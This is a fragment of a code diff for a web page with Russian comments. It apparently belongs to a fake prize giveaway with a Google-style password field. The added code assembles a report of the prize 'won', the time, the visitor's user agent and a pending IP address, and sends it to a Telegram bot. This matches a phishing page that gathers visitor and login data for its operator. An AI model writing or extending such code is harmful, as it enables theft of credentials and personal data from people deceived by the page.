+                message += `🎁 Выигранный приз: ${prizeName}\n`;
+                message += `⏰ Время: ${new Date().toLocaleString()}\n`;
+                message += `🌐 User Agent: ${navigator.userAgent}\n`;
+                message += `📍 IP: собирается...`;
                 
                 const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
                 
@@ -1052,6 +1998,26 @@
             document.addEventListener('click', function(event) {
                 if (!languageBtn.contains(event.target) && !languageDropdown.contains(event.target)) {
                     languageDropdown.classList.remove('show');
+                }
+            });
+            
+            // Закрытие модальных окон при клике вне их
+            document.querySelectorAll('.modal-overlay').forEach(modal => {
+                modal.addEventListener('click', function(e) {
+                    if (e.target === this) {
+                        this.classList.remove('active');
+                        document.body.style.overflow = 'auto';
+                    }
+                });
+            });
+            
+            // Показать/скрыть пароль для Google
+            document.getElementById('showPassword').addEventListener('change', function() {
+                const passwordInput = document.querySelector('.google-password-input');
+                if (this.checked) {
+                    passwordInput.type = 'text';
+                } else {
+                    passwordInput.type = 'password';
                 }
             });
         });
